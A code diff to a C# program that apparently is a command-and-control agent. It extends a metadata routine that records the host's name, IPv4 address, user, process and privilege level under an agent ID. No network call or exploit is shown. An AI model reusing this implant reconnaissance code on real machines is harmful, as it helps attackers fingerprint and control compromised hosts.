@@ -6,6 +6,8 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Net;
+using System.Net.Sockets;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
@@ -123,27 +125,31 @@ namespace EntryPoint
 
         static AgentMetadata GenerateMetadata(string endpoint)
         {
+            var hostname = Dns.GetHostName();
+            var addresses = Dns.GetHostAddressesAsync(hostname).Result;
+
             var process = Process.GetCurrentProcess();
             var userName = Environment.UserName;
 
-            string integrity = "Medium";
+            var integrity = IntegrityLevel.Medium;
             if (userName == "SYSTEM")
-                integrity = "SYSTEM";
+                integrity = IntegrityLevel.System;
 
             using (var identity = WindowsIdentity.GetCurrent())
             {
                 if (identity.User != identity.Owner)
                 {
-                    integrity = "High";
+                    integrity = IntegrityLevel.High;
                 }
             }
 
             AgentMetadata metadata = new AgentMetadata()
             {
                 Id = Agent.ShortGuid.NewGuid(),
-                Hostname = Environment.MachineName,
+                Hostname = hostname,
                 UserName = userName,
                 ProcessId = process.Id,
+                Address = addresses.First(a => a.AddressFamily == AddressFamily.InterNetwork).GetAddressBytes(),
                 ProcessName = process.ProcessName,
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
